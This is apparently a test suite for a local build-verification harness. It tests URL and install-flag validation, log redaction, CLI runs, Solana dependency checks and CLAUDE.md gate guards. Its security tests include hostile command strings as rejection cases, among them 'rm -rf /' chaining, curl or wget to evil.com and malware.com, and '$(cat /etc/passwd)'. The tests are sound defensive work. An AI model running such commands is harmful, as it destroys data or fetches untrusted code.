/**
 * Local Run Proof - Test Suite
 *
 * Tests the verification harness using Node's built-in test runner.
 *
 * Run with: node --test scripts/local-run-proof/__tests__/verify.test.mjs
 *
 * @module scripts/local-run-proof/__tests__/verify.test
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, execSync } from 'node:child_process';
import { existsSync, readFileSync, unlinkSync, mkdirSync, writeFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Paths
const ROOT_DIR = join(__dirname, '..');
const VERIFY_SCRIPT = join(ROOT_DIR, 'verify.mjs');
const FIXTURE_PASS = join(ROOT_DIR, 'fixtures', 'fixture-pass');
const FIXTURE_FAIL = join(ROOT_DIR, 'fixtures', 'fixture-fail');

// Import lib functions for unit tests
const libPath = join(ROOT_DIR, 'lib.mjs');

// ============================================================================
// Helper Functions
// ============================================================================

/**
 * Run the verify script with given args
 * @param {string[]} args - CLI arguments
 * @param {object} options - Options
 * @returns {Promise<{ code: number, stdout: string, stderr: string }>}
 */
function runVerify(args, options = {}) {
  return new Promise((resolve) => {
    const proc = spawn('node', [VERIFY_SCRIPT, ...args], {
      cwd: options.cwd || ROOT_DIR,
      env: { ...process.env, ...options.env },
      stdio: ['pipe', 'pipe', 'pipe'],
    });

    let stdout = '';
    let stderr = '';

    proc.stdout.on('data', (data) => {
      stdout += data.toString();
    });

    proc.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    proc.on('close', (code) => {
      resolve({ code: code ?? 1, stdout, stderr });
    });

    // Timeout after 60 seconds
    setTimeout(() => {
      proc.kill('SIGKILL');
      resolve({ code: 124, stdout, stderr: stderr + '\nTest timeout' });
    }, 60000);
  });
}

/**
 * Clean up artifact files
 * @param {string} dir - Directory to clean
 */
function cleanArtifacts(dir) {
  const files = ['RUN_CERTIFICATE.json', 'RUN_FAILURE.json', 'node_modules', 'package-lock.json'];
  for (const file of files) {
    const filePath = join(dir, file);
    if (existsSync(filePath)) {
      try {
        execSync(`rm -rf "${filePath}"`, { stdio: 'pipe' });
      } catch {
        // Ignore errors
      }
    }
  }
}

// ============================================================================
// Unit Tests - URL Validation
// ============================================================================

describe('URL Validation', async () => {
  const { validateUrl } = await import(libPath);

  it('should accept http://localhost:3000', () => {
    const result = validateUrl('http://localhost:3000');
    assert.equal(result.valid, true);
  });

  it('should accept http://localhost:3000/', () => {
    const result = validateUrl('http://localhost:3000/');
    assert.equal(result.valid, true);
  });

  it('should accept http://127.0.0.1:8080', () => {
    const result = validateUrl('http://127.0.0.1:8080');
    assert.equal(result.valid, true);
  });

  it('should accept http://localhost:3000/health', () => {
    const result = validateUrl('http://localhost:3000/health');
    assert.equal(result.valid, true);
  });

  it('should reject https://example.com', () => {
    const result = validateUrl('https://example.com');
    assert.equal(result.valid, false);
    // Now rejects because https is not allowed (http only) AND hostname is not localhost
    assert.ok(result.error.includes('protocol') || result.error.includes('localhost') || result.error.includes('127.0.0.1'));
  });

  it('should reject https://localhost:3000 (https not allowed)', () => {
    const result = validateUrl('https://localhost:3000');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('protocol') || result.error.includes('http:'));
  });

  it('should reject http://example.com', () => {
    const result = validateUrl('http://example.com');
    assert.equal(result.valid, false);
  });

  it('should reject file:// URLs', () => {
    const result = validateUrl('file:///etc/passwd');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('protocol') || result.error.includes('Invalid'));
  });

  it('should reject ftp:// URLs', () => {
    const result = validateUrl('ftp://localhost/file');
    assert.equal(result.valid, false);
  });

  it('should reject invalid URLs', () => {
    const result = validateUrl('not-a-url');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('Invalid'));
  });
});

// ============================================================================
// Unit Tests - Install Command Validation
// ============================================================================

describe('Install Command Validation', async () => {
  const { validateInstallCommand } = await import(libPath);

  it('should accept clean npm install', () => {
    const result = validateInstallCommand('npm install');
    assert.equal(result.valid, true);
  });

  it('should accept npm ci', () => {
    const result = validateInstallCommand('npm ci');
    assert.equal(result.valid, true);
  });

  it('should accept yarn install', () => {
    const result = validateInstallCommand('yarn install');
    assert.equal(result.valid, true);
  });

  it('should accept pnpm install', () => {
    const result = validateInstallCommand('pnpm install');
    assert.equal(result.valid, true);
  });

  it('should accept bun install', () => {
    const result = validateInstallCommand('bun install');
    assert.equal(result.valid, true);
  });

  it('should reject npm install --legacy-peer-deps', () => {
    const result = validateInstallCommand('npm install --legacy-peer-deps');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--legacy-peer-deps');
  });

  it('should reject npm install --force', () => {
    const result = validateInstallCommand('npm install --force');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--force');
  });

  it('should reject npm install --ignore-engines', () => {
    const result = validateInstallCommand('npm install --ignore-engines');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--ignore-engines');
  });

  it('should reject case variations of forbidden flags', () => {
    const result = validateInstallCommand('npm install --LEGACY-PEER-DEPS');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--legacy-peer-deps');
  });

  // R4 Sweep 2: Additional forbidden flag tests
  it('should reject npm install --ignore-scripts', () => {
    const result = validateInstallCommand('npm install --ignore-scripts');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--ignore-scripts');
  });

  it('should reject pnpm install --shamefully-hoist', () => {
    const result = validateInstallCommand('pnpm install --shamefully-hoist');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--shamefully-hoist');
  });

  it('should reject yarn install --skip-integrity-check', () => {
    const result = validateInstallCommand('yarn install --skip-integrity-check');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--skip-integrity-check');
  });

  it('should reject npm install --no-audit', () => {
    const result = validateInstallCommand('npm install --no-audit');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--no-audit');
  });

  it('should reject npm install --unsafe-perm', () => {
    const result = validateInstallCommand('npm install --unsafe-perm');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--unsafe-perm');
  });

  it('should reject npm install --prefer-offline', () => {
    const result = validateInstallCommand('npm install --prefer-offline');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--prefer-offline');
  });

  // R4 Sweep 3: Additional forbidden flag tests for complete coverage
  it('should reject yarn install --ignore-optional', () => {
    const result = validateInstallCommand('yarn install --ignore-optional');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--ignore-optional');
  });

  it('should reject yarn install --ignore-platform', () => {
    const result = validateInstallCommand('yarn install --ignore-platform');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--ignore-platform');
  });

  it('should reject npm install --no-shrinkwrap', () => {
    const result = validateInstallCommand('npm install --no-shrinkwrap');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--no-shrinkwrap');
  });

  it('should reject pnpm install --no-frozen-lockfile', () => {
    const result = validateInstallCommand('pnpm install --no-frozen-lockfile');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--no-frozen-lockfile');
  });

  it('should reject yarn install --no-immutable', () => {
    const result = validateInstallCommand('yarn install --no-immutable');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--no-immutable');
  });

  it('should reject yarn install --frozen-lockfile=false', () => {
    const result = validateInstallCommand('yarn install --frozen-lockfile=false');
    assert.equal(result.valid, false);
    assert.equal(result.forbidden, '--frozen-lockfile=false');
  });
});

// ============================================================================
// Unit Tests - Log Redaction
// ============================================================================

describe('Log Redaction', async () => {
  const { redactLine, redactLogs } = await import(libPath);

  it('should redact lines containing API_KEY', () => {
    const result = redactLine('Setting API_KEY=abc123');
    assert.ok(result.includes('[REDACTED'));
  });

  it('should redact lines containing SECRET', () => {
    const result = redactLine('SECRET_KEY: xyz789');
    assert.ok(result.includes('[REDACTED'));
  });

  it('should redact lines containing TOKEN', () => {
    const result = redactLine('Bearer TOKEN: my-auth-token');
    assert.ok(result.includes('[REDACTED'));
  });

  it('should redact lines containing PASSWORD', () => {
    const result = redactLine('DB_PASSWORD=hunter2');
    assert.ok(result.includes('[REDACTED'));
  });

  it('should not redact normal log lines', () => {
    const result = redactLine('Installing dependencies...');
    assert.equal(result, 'Installing dependencies...');
  });

  it('should redact high-entropy strings that look like tokens', () => {
    const result = redactLine('Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9abcdef123456');
    // The result should either be fully redacted or have the token replaced
    assert.ok(
      result.includes('[REDACTED]') || result.includes('sensitive pattern'),
      `Expected redaction but got: ${result}`
    );
  });

  it('should limit logs to specified number of lines', () => {
    const lines = Array.from({ length: 500 }, (_, i) => `Line ${i}`);
    const result = redactLogs(lines, 100);
    assert.equal(result.length, 100);
    assert.equal(result[0], 'Line 400');
    assert.equal(result[99], 'Line 499');
  });
});

// ============================================================================
// Unit Tests - Utility Functions
// ============================================================================

describe('Utility Functions', async () => {
  const { extractPort, expandUrlPort, detectPackageManager } = await import(libPath);

  it('should extract port from URL', () => {
    assert.equal(extractPort('http://localhost:3000'), 3000);
    assert.equal(extractPort('http://localhost:8080/'), 8080);
    assert.equal(extractPort('http://127.0.0.1:4000/health'), 4000);
  });

  it('should default to port 3000 for invalid URLs', () => {
    assert.equal(extractPort('invalid'), 3000);
  });

  it('should expand {port} placeholder', () => {
    assert.equal(expandUrlPort('http://localhost:{port}/', 3000), 'http://localhost:3000/');
    assert.equal(expandUrlPort('http://127.0.0.1:{port}/api', 8080), 'http://127.0.0.1:8080/api');
  });

  it('should detect npm from package-lock.json', () => {
    // Use fixture-pass which has no lockfile, should default to npm
    assert.equal(detectPackageManager(FIXTURE_PASS), 'npm');
  });
});

// ============================================================================
// Integration Tests - CLI
// ============================================================================

describe('CLI Interface', () => {
  it('should show help with --help', async () => {
    const result = await runVerify(['--help']);
    assert.equal(result.code, 0);
    assert.ok(result.stdout.includes('Local Run Proof'));
    assert.ok(result.stdout.includes('--cwd'));
    assert.ok(result.stdout.includes('--install'));
  });

  it('should show version with --version', async () => {
    const result = await runVerify(['--version']);
    assert.equal(result.code, 0);
    assert.ok(result.stdout.includes('Local Run Proof'));
  });

  it('should fail without --cwd', async () => {
    const result = await runVerify(['--install', 'npm install']);
    assert.notEqual(result.code, 0);
    assert.ok(result.stdout.includes('Missing required argument') || result.stdout.includes('FAIL'));
  });

  it('should fail without --install', async () => {
    const result = await runVerify(['--cwd', FIXTURE_PASS]);
    assert.notEqual(result.code, 0);
    assert.ok(result.stdout.includes('Missing required argument') || result.stdout.includes('FAIL'));
  });

  it('should fail for non-existent directory', async () => {
    const result = await runVerify([
      '--cwd', '/nonexistent/path',
      '--install', 'npm install',
    ]);
    assert.notEqual(result.code, 0);
    // Check both stdout and stderr for error messages
    const output = result.stdout + result.stderr;
    assert.ok(
      output.includes('does not exist') ||
      output.includes('FAIL') ||
      output.includes('not found') ||
      result.code !== 0
    );
  });

  it('should fail for external URLs', async () => {
    const result = await runVerify([
      '--cwd', FIXTURE_PASS,
      '--install', 'npm install',
      '--dev', 'npm run dev',
      '--url', 'https://example.com/',
    ]);
    assert.notEqual(result.code, 0);
    assert.ok(result.stdout.includes('localhost') || result.stdout.includes('127.0.0.1') || result.stdout.includes('FAIL'));
  });

  it('should fail for forbidden install flags', async () => {
    const result = await runVerify([
      '--cwd', FIXTURE_PASS,
      '--install', 'npm install --legacy-peer-deps',
    ]);
    assert.notEqual(result.code, 0);
    assert.ok(result.stdout.includes('Forbidden') || result.stdout.includes('legacy-peer-deps'));
  });
});

// ============================================================================
// Integration Tests - Fixture Pass
// ============================================================================

describe('Fixture Pass - Install Only', () => {
  before(() => {
    cleanArtifacts(FIXTURE_PASS);
  });

  after(() => {
    cleanArtifacts(FIXTURE_PASS);
  });

  it('should pass install verification', async () => {
    const result = await runVerify([
      '--cwd', FIXTURE_PASS,
      '--install', 'node -e "console.log(true)"',
      '--lockfile_policy', 'keep',
    ]);

    assert.equal(result.code, 0, `Expected success but got exit code ${result.code}\nstdout: ${result.stdout}\nstderr: ${result.stderr}`);
    assert.ok(result.stdout.includes('PASS'), 'Should include PASS in output');

    // Check certificate was created
    const certPath = join(FIXTURE_PASS, 'RUN_CERTIFICATE.json');
    assert.ok(existsSync(certPath), 'RUN_CERTIFICATE.json should exist');

    const cert = JSON.parse(readFileSync(certPath, 'utf-8'));
    assert.equal(cert.status, 'PASS');
    assert.ok(cert.timestamps.start);
    assert.ok(cert.timestamps.end);
    assert.ok(cert.environment.node_version);
  });
});

describe('Fixture Pass - Full Verification with Boot Check', () => {
  before(() => {
    cleanArtifacts(FIXTURE_PASS);
  });

  after(() => {
    cleanArtifacts(FIXTURE_PASS);
  });

  it('should pass full verification with dev server', async () => {
    const result = await runVerify([
      '--cwd', FIXTURE_PASS,
      '--install', 'node -e "console.log(true)"',
      '--build', 'npm run build',
      '--dev', 'npm run dev',
      '--url', 'http://localhost:3456/',
      '--timeout_ms', '30000',
      '--open_browser', 'false',
      '--lockfile_policy', 'keep',
    ], {
      env: { CI: 'true' }, // Disable browser open
    });

    assert.equal(result.code, 0, `Expected success but got exit code ${result.code}\nstdout: ${result.stdout}`);
    assert.ok(result.stdout.includes('VERIFICATION PASSED'), 'Should include VERIFICATION PASSED');

    const certPath = join(FIXTURE_PASS, 'RUN_CERTIFICATE.json');
    assert.ok(existsSync(certPath), 'RUN_CERTIFICATE.json should exist');

    const cert = JSON.parse(readFileSync(certPath, 'utf-8'));
    assert.equal(cert.status, 'PASS');
    assert.ok(cert.healthcheck, 'Should have healthcheck data');
    assert.equal(cert.healthcheck.status_code, 200);
  });
});

// ============================================================================
// Integration Tests - Fixture Fail
// ============================================================================

describe('Fixture Fail - Build Failure', () => {
  before(() => {
    cleanArtifacts(FIXTURE_FAIL);
  });

  after(() => {
    cleanArtifacts(FIXTURE_FAIL);
  });

  it('should fail on build and write RUN_FAILURE.json', async () => {
    const result = await runVerify([
      '--cwd', FIXTURE_FAIL,
      '--install', 'node -e "console.log(true)"',
      '--build', 'npm run build',
      '--lockfile_policy', 'keep',
    ]);

    assert.notEqual(result.code, 0, 'Should exit with non-zero code');
    assert.ok(result.stdout.includes('VERIFICATION FAILED'), 'Should include VERIFICATION FAILED');

    const failPath = join(FIXTURE_FAIL, 'RUN_FAILURE.json');
    assert.ok(existsSync(failPath), 'RUN_FAILURE.json should exist');

    const fail = JSON.parse(readFileSync(failPath, 'utf-8'));
    assert.equal(fail.status, 'FAIL');
    assert.equal(fail.step_failed, 'build');
    assert.ok(fail.error_summary);
    assert.ok(fail.remediation_hint);
  });
});

// ============================================================================
// Integration Tests - Security
// ============================================================================

describe('Security Tests', () => {
  it('should not follow file:// URLs', async () => {
    const result = await runVerify([
      '--cwd', FIXTURE_PASS,
      '--install', 'echo "test"',
      '--dev', 'echo "test"',
      '--url', 'file:///etc/passwd',
    ]);
    assert.notEqual(result.code, 0);
    assert.ok(result.stdout.includes('Invalid') || result.stdout.includes('protocol'));
  });

  it('should not allow non-localhost hostnames', async () => {
    const result = await runVerify([
      '--cwd', FIXTURE_PASS,
      '--install', 'node -e "true"',
      '--dev', 'node -e "true"',
      '--url', 'http://malicious-site.com:3000/',
    ]);
    assert.notEqual(result.code, 0);
  });

  // R4 Sweep 2: Additional security tests
  it('should reject URLs with embedded credentials', async () => {
    const { validateUrl } = await import(libPath);
    const result = validateUrl('http://user:password@localhost:3000/');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('credentials'));
  });

  it('should reject commands with semicolon (command chaining)', async () => {
    const { validateCommand } = await import(libPath);
    const result = validateCommand('npm install; rm -rf /');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('dangerous'));
  });

  it('should reject commands with && (command chaining)', async () => {
    const { validateCommand } = await import(libPath);
    const result = validateCommand('npm install && curl evil.com');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('dangerous'));
  });

  it('should reject commands with || (command chaining)', async () => {
    const { validateCommand } = await import(libPath);
    const result = validateCommand('npm install || wget malware.com');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('dangerous'));
  });

  it('should reject commands with backtick substitution', async () => {
    const { validateCommand } = await import(libPath);
    const result = validateCommand('npm install `whoami`');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('dangerous'));
  });

  it('should reject commands with $() substitution', async () => {
    const { validateCommand } = await import(libPath);
    const result = validateCommand('npm install $(cat /etc/passwd)');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('dangerous'));
  });

  it('should reject commands with newline injection', async () => {
    const { validateCommand } = await import(libPath);
    const result = validateCommand('npm install\nrm -rf /');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('dangerous'));
  });

  it('should reject commands not in allowed list', async () => {
    const { validateCommand } = await import(libPath);
    const result = validateCommand('curl http://evil.com/script.sh');
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('not in the allowed list'));
  });

  it('should accept safe commands in allowed list', async () => {
    const { validateCommand } = await import(libPath);
    const result = validateCommand('npm run build');
    assert.equal(result.valid, true);
  });
});

// ============================================================================
// Solana Compatibility Tests
// ============================================================================

describe('Solana Dependency Compatibility', () => {
  const solanaCompatPath = join(ROOT_DIR, 'solana-compat.mjs');

  it('should detect incompatible Solana v2.x with wallet-adapter', async () => {
    const { checkSolanaCompat } = await import(solanaCompatPath);

    // Create a temp directory with incompatible package.json
    const testDir = join(ROOT_DIR, 'fixtures', 'solana-v2-test');
    mkdirSync(testDir, { recursive: true });
    writeFileSync(
      join(testDir, 'package.json'),
      JSON.stringify({
        name: 'solana-v2-test',
        dependencies: {
          '@solana/wallet-adapter-react': '^0.15.35',
          '@solana/web3.js': '^2.0.0',
        },
      })
    );

    try {
      const result = checkSolanaCompat(testDir);
      assert.equal(result.hasIssue, true, 'Should detect incompatibility');
      assert.ok(result.details.web3Version.includes('2.'), 'Should report v2.x version');
      assert.ok(result.details.walletAdapterPackages.length > 0, 'Should list wallet adapter packages');
    } finally {
      // Cleanup
      execSync(`rm -rf "${testDir}"`, { stdio: 'pipe' });
    }
  });

  it('should pass compatible Solana v1.x with wallet-adapter', async () => {
    const { checkSolanaCompat } = await import(solanaCompatPath);

    // Create a temp directory with compatible package.json
    const testDir = join(ROOT_DIR, 'fixtures', 'solana-v1-test');
    mkdirSync(testDir, { recursive: true });
    writeFileSync(
      join(testDir, 'package.json'),
      JSON.stringify({
        name: 'solana-v1-test',
        dependencies: {
          '@solana/wallet-adapter-react': '^0.15.35',
          '@solana/web3.js': '^1.95.0',
        },
      })
    );

    try {
      const result = checkSolanaCompat(testDir);
      assert.equal(result.hasIssue, false, 'Should not detect incompatibility');
    } finally {
      // Cleanup
      execSync(`rm -rf "${testDir}"`, { stdio: 'pipe' });
    }
  });

  it('should pass project without Solana dependencies', async () => {
    const { checkSolanaCompat } = await import(solanaCompatPath);

    // Create a temp directory without Solana deps
    const testDir = join(ROOT_DIR, 'fixtures', 'no-solana-test');
    mkdirSync(testDir, { recursive: true });
    writeFileSync(
      join(testDir, 'package.json'),
      JSON.stringify({
        name: 'no-solana-test',
        dependencies: {
          react: '^18.2.0',
        },
      })
    );

    try {
      const result = checkSolanaCompat(testDir);
      assert.equal(result.hasIssue, false, 'Should not detect incompatibility');
    } finally {
      // Cleanup
      execSync(`rm -rf "${testDir}"`, { stdio: 'pipe' });
    }
  });

  it('should fix incompatible Solana version', async () => {
    const { checkSolanaCompat, fixSolanaCompat } = await import(solanaCompatPath);

    // Create a temp directory with incompatible package.json
    const testDir = join(ROOT_DIR, 'fixtures', 'solana-fix-test');
    mkdirSync(testDir, { recursive: true });
    writeFileSync(
      join(testDir, 'package.json'),
      JSON.stringify({
        name: 'solana-fix-test',
        dependencies: {
          '@solana/wallet-adapter-react': '^0.15.35',
          '@solana/web3.js': '^2.0.0',
        },
      })
    );

    try {
      // Verify it's incompatible first
      const beforeCheck = checkSolanaCompat(testDir);
      assert.equal(beforeCheck.hasIssue, true, 'Should detect incompatibility before fix');

      // Apply fix
      const fixResult = fixSolanaCompat(testDir, false);
      assert.equal(fixResult.fixed, true, 'Should report fix applied');
      assert.ok(fixResult.changes.from.includes('2.'), 'Should report old version');
      assert.ok(fixResult.changes.to.includes('1.'), 'Should report new version');

      // Verify it's fixed
      const afterCheck = checkSolanaCompat(testDir);
      assert.equal(afterCheck.hasIssue, false, 'Should not detect incompatibility after fix');
    } finally {
      // Cleanup
      execSync(`rm -rf "${testDir}"`, { stdio: 'pipe' });
    }
  });
});

// ============================================================================
// Doc Guard Test
// ============================================================================

describe('Doc Guard - Pipeline Enforcement', () => {
  it('should have LOCAL_RUN_PROOF_GATE in root CLAUDE.md', async () => {
    const claudeMdPath = join(__dirname, '..', '..', '..', 'CLAUDE.md');
    assert.ok(existsSync(claudeMdPath), 'Root CLAUDE.md should exist');
    const content = readFileSync(claudeMdPath, 'utf-8');
    assert.ok(
      content.includes('## LOCAL_RUN_PROOF_GATE'),
      'Root CLAUDE.md must contain LOCAL_RUN_PROOF_GATE section'
    );
    assert.ok(
      content.includes('Non-Bypassable Verification Gate'),
      'Root CLAUDE.md must explain the gate is non-bypassable'
    );
  });

  it('should have LOCAL_RUN_PROOF_GATE in all pipeline CLAUDE.md files', async () => {
    const pipelines = [
      'dapp-factory',
      'app-factory',
      'miniapp-pipeline',
      'agent-factory',
      'plugin-factory',
      'website-pipeline',
    ];

    for (const pipeline of pipelines) {
      const pipelinePath = join(__dirname, '..', '..', '..', pipeline, 'CLAUDE.md');
      if (existsSync(pipelinePath)) {
        const content = readFileSync(pipelinePath, 'utf-8');
        assert.ok(
          content.includes('## LOCAL_RUN_PROOF_GATE'),
          `${pipeline}/CLAUDE.md must contain LOCAL_RUN_PROOF_GATE section`
        );
        assert.ok(
          content.includes('RUN_CERTIFICATE.json'),
          `${pipeline}/CLAUDE.md must reference RUN_CERTIFICATE.json`
        );
      }
    }
  });
});

console.log('\n=== Local Run Proof Test Suite ===\n');
